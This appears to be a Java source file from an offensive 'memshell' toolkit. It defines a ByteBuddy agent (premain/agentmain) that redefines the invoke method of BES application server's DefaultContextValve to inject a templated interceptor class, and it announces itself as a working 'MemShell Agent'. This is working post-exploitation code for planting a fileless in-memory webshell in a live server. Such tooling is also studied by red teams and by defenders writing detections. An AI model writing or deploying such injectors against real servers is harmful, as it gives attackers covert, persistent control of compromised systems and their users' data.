package com.reajason.javaweb.memshell.injector.bes;

import net.bytebuddy.agent.builder.AgentBuilder;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.description.type.TypeDescription;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.matcher.ElementMatchers;
import net.bytebuddy.utility.JavaModule;

import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/12/28
 */
public class BesContextValveAgentInjector implements AgentBuilder.Transformer {

    static Class<?> interceptorClass = null;

    static {
        try {
            interceptorClass = Class.forName(getClassName());
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    public DynamicType.Builder<?> transform(DynamicType.Builder<?> builder,
                                            TypeDescription typeDescription,
                                            ClassLoader classLoader, JavaModule module,
                                            ProtectionDomain protectionDomain) {
        return builder.visit(Advice.to(interceptorClass).on(named("invoke").and(ElementMatchers.returns(void.class))));
    }

    public static void premain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    public static String getClassName() {
        return "{{advisorName}}";
    }

    private static void launch(Instrumentation inst) throws Exception {
        System.out.println("MemShell Agent is starting");
        new AgentBuilder.Default()
                .ignore(ElementMatchers.none())
                .disableClassFormatChanges()
                .with(AgentBuilder.RedefinitionStrategy.REDEFINITION)
//                .with(AgentBuilder.Listener.StreamWriting.toSystemError().withErrorsOnly())
//                .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withTransformationsOnly())
                .type(named("com.bes.enterprise.webtier.core.DefaultContextValve"))
                .transform(new BesContextValveAgentInjector())
                .installOn(inst);
        System.out.println("MemShell Agent is working at com.bes.enterprise.webtier.core.DefaultContextValve.invoke");
    }
}